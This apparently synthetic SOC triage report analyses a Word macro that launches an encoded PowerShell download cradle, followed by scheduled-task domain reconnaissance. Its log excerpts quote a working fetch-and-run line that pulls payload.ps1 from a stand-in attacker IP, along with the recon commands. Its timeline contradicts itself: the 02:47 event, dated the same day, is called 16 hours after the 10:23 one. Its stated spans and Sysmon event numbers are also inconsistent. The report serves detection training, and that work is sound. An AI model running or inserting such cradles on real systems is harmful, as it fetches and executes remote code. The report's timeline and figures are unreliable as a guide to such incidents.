# Triage Report: PS-001 — Suspicious PowerShell Execution (T1059.001)

| Field | Value |
|-------|-------|
| Report ID | PS-001 |
| Date | 2024-11-18 |
| Analyst | analyst1 |
| Alert Rule | PS-EXEC-001 — Suspicious PowerShell Execution |
| Severity | **Critical** (Scenario A: office-spawned download cradle + outbound connection; Scenario B: late-night recon from service account) |
| Status | **Escalate — True Positive / Active Compromise Suspected** |
| MITRE Techniques | T1059.001 (PowerShell), T1105 (Ingress Tool Transfer), T1087 (Account Discovery), T1482 (Domain Trust Discovery) |
| Log Sources | Windows Security Log (4688), PowerShell Operational Log (4104), Sysmon (Event IDs 1, 3) |
| Affected Host | WORKSTATION-01 |
| Affected Accounts | LAB\user1 (Scenario A), LAB\svc_account1 (Scenario B) |

---

## 1. Executive Summary

On 2024-11-18, two suspicious PowerShell execution events were detected on
`WORKSTATION-01`. The first (Scenario A, 10:23 UTC) involved `WINWORD.EXE` spawning
a PowerShell process via `cmd.exe` with multiple obfuscation flags; Script Block
Logging (EventID 4104) confirmed the decoded payload was an `IEX` download cradle
targeting `203.0.113.99`, and Sysmon logged an outbound HTTP connection from
`powershell.exe` to that IP seconds later. The second event (Scenario B, 02:47 UTC)
showed `svchost.exe` (Windows Task Scheduler) spawning PowerShell under
`LAB\svc_account1` in the early hours, followed by five sequential recon child
processes — `whoami`, `net user /domain`, `nltest /domain_trusts`, `ping DC-01`, and
a registry query — in 28 seconds. Taken together, the two incidents suggest a
macro-delivered initial access payload (Scenario A) that subsequently established
scheduled-task persistence and executed post-exploitation reconnaissance
(Scenario B). Both are assessed as **Critical true positives** requiring immediate
host isolation and account investigation.

---

## 2. Five W's + How

### Who — Affected Accounts and Host

| Account | Scenario | Role | Action Taken by Process |
|---------|---------|------|------------------------|
| `LAB\user1` | A | Standard user | Opened malicious document; PowerShell ran under their session |
| `LAB\svc_account1` | B | Service account | Executed recon PowerShell at 02:47; IntegrityLevel=High is anomalous for this role |
| `WORKSTATION-01` | Both | Windows workstation | Source host for both incident threads |

The `IntegrityLevel=High` for `svc_account1` in Scenario B is a critical
observation — service accounts processing background tasks typically run at Medium
or System integrity. High integrity suggests either UAC elevation was triggered or
the account has been configured with elevated privileges inconsistent with its stated
service role.

---

### What — Pattern Detected

**Scenario A: Office Macro → Encoded Download Cradle (Variants A + B + 4104)**

Three detection variants fired simultaneously:
- **Variant A** (parent process): `WINWORD.EXE` is the grandparent of `powershell.exe`
  via `cmd.exe` — a definitive indicator of macro-based code execution
- **Variant B** (flag score): `-ExecutionPolicy Bypass` + `-WindowStyle Hidden` +
  `-NonInteractive` + `-EncodedCommand` = flag score 8 (threshold: 4)
- **4104 Script Block**: decoded payload = `IEX (New-Object System.Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')` — a textbook in-memory download cradle

**Scenario B: Scheduled Task → Post-Exploitation Recon (Variants B + C)**

- **Variant B** (flag score): same flag combination, score 8, executed under `svc_account1` at 02:47 UTC
- **Variant C** (child processes): 5 recon binaries in 28 seconds from the same PowerShell PID: `whoami /all`, `net user /domain`, `nltest /domain_trusts`, `ping -n 1 DC-01`, `reg query HKLM\SYSTEM\...`
- **Time-of-day anomaly**: 02:47 UTC is outside all expected business activity for this host and account

The two scenarios separated by ~16 hours form a coherent intrusion timeline: macro
delivers downloader (Scenario A) → payload installs scheduled persistence → scheduled
task fires overnight to run reconnaissance (Scenario B).

---

### When — Time Windows

| Event | Timestamp (UTC) |
|-------|----------------|
| user1 opens malicious document (inferred) | 2024-11-18 10:22:58Z (approx) |
| WINWORD.EXE spawns cmd.exe | 2024-11-18 10:23:09Z |
| cmd.exe spawns powershell.exe | 2024-11-18 10:23:11Z |
| 4104 Script Block — download cradle decoded | 2024-11-18 10:23:12Z |
| powershell.exe connects to 203.0.113.99:80 | 2024-11-18 10:23:14Z |
| powershell.exe spawns whoami.exe | 2024-11-18 10:23:16Z |
| Gap (payload runs, persistence likely installed) | ~16 hours |
| svchost spawns PowerShell under svc_account1 | 2024-11-18 02:47:03Z |
| First recon child process (whoami /all) | 2024-11-18 02:47:09Z |
| Last recon child process (reg query) | 2024-11-18 02:47:31Z |
| Total recon window (Scenario B) | 28 seconds |

The 5-second span from document open to outbound network connection in Scenario A
indicates a fully automated payload — no user interaction beyond opening the document
was required.

---

### Where — Host and Infrastructure

| Indicator | Value | Notes |
|-----------|-------|-------|
| Affected host | WORKSTATION-01 | Windows workstation; both scenarios |
| Scenario A outbound IP | `203.0.113.99` | RFC 5737 documentation IP (synthetic); payload download host |
| Scenario A outbound port | 80 (HTTP) | Unencrypted; payload visible to proxy if TLS inspection not required |
| Scenario A process path | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | System PowerShell; not a renamed copy |
| Scenario A working directory | `C:\Users\user1\AppData\Local\Temp\` (inferred) | Temp directory execution is a staging indicator |
| Scenario B parent | `C:\Windows\System32\svchost.exe` (PID 0x0340) | Task Scheduler service host |

In a real SOC, the Sysmon network connection event (Event 4) would allow immediate
proxy or firewall lookup to determine if `203.0.113.99` also appeared in DNS or
proxy logs, whether the downloaded file was cached, and whether any other hosts
contacted the same IP.

---

### Why — Attacker Objective Hypothesis

**Stage 1 — Initial Access and Foothold (Scenario A):**
The macro in `Q4_Bonus_Statement.docm` delivered a PowerShell download cradle that
fetched a second-stage payload from `203.0.113.99/payload.ps1`. The immediate
`whoami` child process suggests the payload included an operator-visible reconnaissance
step — consistent with a stage-2 loader that confirms the target context before
deploying further tooling.

**Stage 2 — Persistence (inferred between scenarios):**
The appearance of `svc_account1` running a scheduled PowerShell session 16 hours
later, with the same obfuscation flags and a 4104 script block consistent with C2
activity, suggests the stage-2 payload installed a scheduled task for persistence.
The use of `svc_account1` rather than `user1` may indicate privilege escalation or
lateral movement during the gap period.

**Stage 3 — Active Reconnaissance (Scenario B):**
The five recon child processes map to a standard post-exploitation enumeration
playbook:

| Command | MITRE | Objective |
|---------|-------|-----------|
| `whoami /all` | T1033 | Confirm identity and privilege level on this host |
| `net user /domain` | T1087.002 | Enumerate all domain user accounts |
| `nltest /domain_trusts` | T1482 | Map domain trust relationships (identify pivot targets) |
| `ping -n 1 DC-01` | T1018 | Confirm connectivity to domain controller |
| `reg query HKLM\SYSTEM\CurrentControlSet\Services` | T1007 | Enumerate services for lateral movement or persistence targets |

This sequence is consistent with an adversary preparing for lateral movement to the
domain controller.

---

### How — Evidence Chain

```
[1] user1 opens Q4_Bonus_Statement.docm in Word (10:22:58Z, inferred)
        ↓
[2] Macro executes: WINWORD.EXE (PID 0x2A4C) spawns cmd.exe (PID 0x1324) [Event 1]
    cmd.exe CommandLine: cmd.exe /c powershell.exe -ExecutionPolicy Bypass
                         -WindowStyle Hidden -NonInteractive -EncodedCommand <base64>
        ↓
[3] cmd.exe (PID 0x1324) spawns powershell.exe (PID 0x1410) [Event 2]
    FlagScore = 8 → Variant B fires
    Variant A fires (WINWORD.EXE as grandparent)
        ↓
[4] 4104 Script Block decodes payload [Event 3]:
    IEX (New-Object System.Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')
        ↓
[5] Sysmon 3: powershell.exe connects outbound to 203.0.113.99:80 [Event 4]
    Payload downloaded and executed in memory (fileless)
        ↓
[6] powershell.exe (PID 0x1410) spawns whoami.exe [Event 5]
    Operator confirms: "who am I on this host?"
        ↓
    [~16 hour gap — payload runs, likely installs persistence under svc_account1]
        ↓
[7] svchost.exe (PID 0x0340, Task Scheduler) spawns powershell.exe (PID 0x1C40)
    at 02:47:03Z under svc_account1 [Event 6]
    Same flag profile (FlagScore 8), different user context → Variant B fires again
        ↓
[8] 4104 Script Block captures C2 beacon content [Event 7]
        ↓
[9] Variant C fires: 5 recon child processes in 28 seconds [Events 8–12]
    whoami → net user /domain → nltest /domain_trusts → ping DC-01 → reg query
```

---

## 3. Evidence

### Quoted Log Lines (Synthetic)

**Scenario A — Office parent spawning PowerShell:**

```
TimeCreated=2024-11-18T10:23:09.441Z EventID=4688 Computer=WORKSTATION-01
Image=C:\Windows\System32\cmd.exe
ParentImage=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE
CommandLine=cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -EncodedCommand aQBlAHgA...
ParentCommandLine="WINWORD.EXE" /n "C:\Users\user1\Downloads\Q4_Bonus_Statement.docm"
```

**Scenario A — 4104 Script Block (decoded download cradle):**

```
TimeCreated=2024-11-18T10:23:12.103Z EventID=4104 Computer=WORKSTATION-01
ScriptBlockText=IEX (New-Object System.Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')
Path=(empty — direct encoded execution, no .ps1 file on disk)
```

**Scenario B — Scheduled task spawns PowerShell at 02:47:**

```
TimeCreated=2024-11-18T02:47:03.814Z EventID=4688 Computer=WORKSTATION-01
SubjectUser=LAB\svc_account1 IntegrityLevel=High
Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentImage=C:\Windows\System32\svchost.exe
CommandLine=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -EncodedCommand cwB0AGEAcgB0...
```

**Scenario B — Domain recon sequence:**

```
TimeCreated=2024-11-18T02:47:12.559Z EventID=4688 SubjectUser=LAB\svc_account1
Image=C:\Windows\System32\net.exe CommandLine=net user /domain

TimeCreated=2024-11-18T02:47:18.774Z EventID=4688 SubjectUser=LAB\svc_account1
Image=C:\Windows\System32\nltest.exe CommandLine=nltest /domain_trusts
```

### Aggregate Counts

| Metric | Scenario A | Scenario B |
|--------|-----------|-----------|
| Detection variants fired | 3 (A + B + 4104) | 2 (B + C) |
| Flag score | 8 | 8 |
| PowerShell processes spawned | 1 | 1 |
| Child processes from PowerShell | 1 (whoami) | 5 (recon sequence) |
| Outbound network connections | 1 (203.0.113.99:80) | 0 observed |
| Execution time (UTC) | 10:23 (business hours) | 02:47 (off-hours) |
| Running user | LAB\user1 (Medium integrity) | LAB\svc_account1 (High integrity — anomalous) |
| Script Block (4104) captured | Yes — download cradle | Yes — C2 pattern (content labeled synthetic) |
| File written to disk | None observed (fileless) | None observed |

---

## 4. Analysis

### Why This Is a True Positive, Not a False Positive

| Property | Benign Explanation | This Alert |
|----------|--------------------|-----------|
| Office parent spawning PowerShell | None — no legitimate admin workflow involves Word launching PowerShell | Scenario A parent is WINWORD.EXE; parent command line names a .docm (macro-enabled) file |
| Flag score 8 | Legitimate admin scripts may use 1–2 flags; score 8 requires encoding + bypass + hidden + non-interactive simultaneously | Score 8 on both scenarios; no known IT automation uses this combination in this environment |
| 4104 contains IEX + DownloadString | Some DSC configurations use IEX; would appear with known-safe script path | Path is empty (no .ps1 on disk); URL is an external IP on port 80; no business relationship |
| Outbound HTTP from powershell.exe to a raw IP | Possible for some update mechanisms | No hostname — raw IP connection; port 80 (unencrypted); immediately follows IEX decode |
| Recon child process sequence (5 in 28 seconds) | IT admin might run these manually — but interactively, not from PowerShell, and not at 02:47 | Automated (28-second sequence); off-hours; under service account; immediately follows encoded PowerShell |
| svc_account1 running at High integrity | Service accounts occasionally elevate | svc_account1 is a service account; High integrity for a non-admin service account is anomalous; no change request correlating to 02:47 execution |

### Additional Data to Check in a Real SOC

1. **Decode and analyse the Scenario B encoded command** — The 4104 event captures
   decoded content. Analyse for C2 IP, callback interval, and payload type to
   determine whether this is a beacon (implying ongoing access) or a one-shot script.

2. **Identify the scheduled task** — Query EventID 4698 (scheduled task created) and
   4702 (task updated) for the period between Scenario A (10:23) and Scenario B
   (02:47). The task name and creation timestamp will reveal when persistence was
   established and whether the task was created by `user1` or another account.

3. **Check for privilege escalation between scenarios** — `user1` runs Scenario A at
   Medium integrity; `svc_account1` runs Scenario B at High integrity. If `user1`
   did not already have access to `svc_account1`, an escalation event should appear
   in the 16-hour gap. Query EventID 4648 (explicit credential logon) and 4624
   (logon type 2/3) for the gap window.

4. **EDR memory analysis on WORKSTATION-01** — The payload was fileless (downloaded
   via IEX, executed in memory). A memory acquisition of the PowerShell process (if
   still running) or a full host memory image may recover the injected payload for
   malware analysis.

5. **Lateral movement check** — `nltest /domain_trusts` and `ping -n 1 DC-01` suggest
   the adversary is mapping the path to the domain controller. Query network flow logs
   and DC authentication logs (EventID 4624) for any logon events from WORKSTATION-01
   or `svc_account1` to DC-01 after 02:47.

6. **Check for additional hosts reaching 203.0.113.99** — Query proxy and firewall
   logs for any other internal hosts that connected to `203.0.113.99`. If multiple
   hosts are affected, the scope expands significantly.

---

## 5. Decision

**Verdict: True Positive — Critical / Escalate to Incident Response**

**Justification:**

- `WINWORD.EXE` spawning PowerShell via `cmd.exe` has no legitimate explanation and
  is a definitive indicator of macro-based code execution.
- The 4104 Script Block confirmed `IEX + DownloadString` — the adversary executed
  arbitrary remote code in memory. This is not a misconfiguration or false positive.
- The Sysmon network connection log confirms the download cradle successfully initiated
  an outbound HTTP connection — the payload *was* fetched, not just attempted.
- Scenario B's timing (02:47 UTC), account (`svc_account1`), integrity level (High),
  and child process sequence (domain enumeration) are all individually anomalous and
  collectively conclusive.
- The connection between Scenario A and Scenario B (same host, same obfuscation
  profile, 16-hour gap consistent with persistence installation) forms a coherent
  multi-stage intrusion timeline.

This alert meets the criteria for **immediate host isolation** and **Incident Response
engagement**. The adversary has demonstrated initial access, fileless payload execution,
likely persistence, and active reconnaissance — the kill chain is well advanced.

---

## 6. Recommended Actions

### Short-Term Containment

| Priority | Action | Owner |
|----------|--------|-------|
| P1 — Immediate | Isolate WORKSTATION-01 via EDR network isolation. Preserve network access for forensic collection only | EDR / SOC Tier 2 |
| P1 — Immediate | Disable and lock `LAB\svc_account1`. Reset `LAB\user1` password and revoke active sessions | Identity / AD team |
| P1 — Immediate | Block `203.0.113.99` at perimeter firewall and proxy for all internal hosts | Network team |
| P2 — Same day | Enumerate and delete the scheduled task that triggered Scenario B. Query 4698/4702 events to identify it | SOC Tier 2 |
| P2 — Same day | Submit `Q4_Bonus_Statement.docm` (if recoverable from user's Downloads or email quarantine) to malware sandbox | SOC Tier 2 |
| P2 — Same day | Export WORKSTATION-01 Security and PowerShell Operational logs for the full 2024-11-17 to 2024-11-18 window before remediation | SOC Tier 1 |

### Longer-Term Hardening

| Priority | Recommendation | Rationale |
|----------|---------------|-----------|
| H1 | Disable Office macros from the internet via GPO (`Block macros in Office files from the internet`) | Closes the delivery vector used in Scenario A |
| H2 | Enable Constrained Language Mode for PowerShell on endpoints | Prevents IEX and reflection-based download cradles from executing; limits the effectiveness of many post-exploitation frameworks |
| H3 | Enforce Just-Enough-Access for service accounts — `svc_account1` should not be able to spawn interactive processes or create scheduled tasks | Removes the high-value persistence path used in Scenario B |
| H4 | Enable Script Block Logging (4104) and Module Logging (4103) organisation-wide if not already deployed | Makes encoded command payloads transparent; critical for detection of fileless attacks |
| H5 | Deploy AppLocker or Windows Defender Application Control (WDAC) to restrict PowerShell execution to signed scripts in known-safe paths | Prevents unsigned, untrusted scripts from executing regardless of execution policy setting |

---

*Report authored by: analyst1 | Log sources: Windows Security (4688), PowerShell Operational (4104), Sysmon (1, 3) | Data: synthetic lab only*
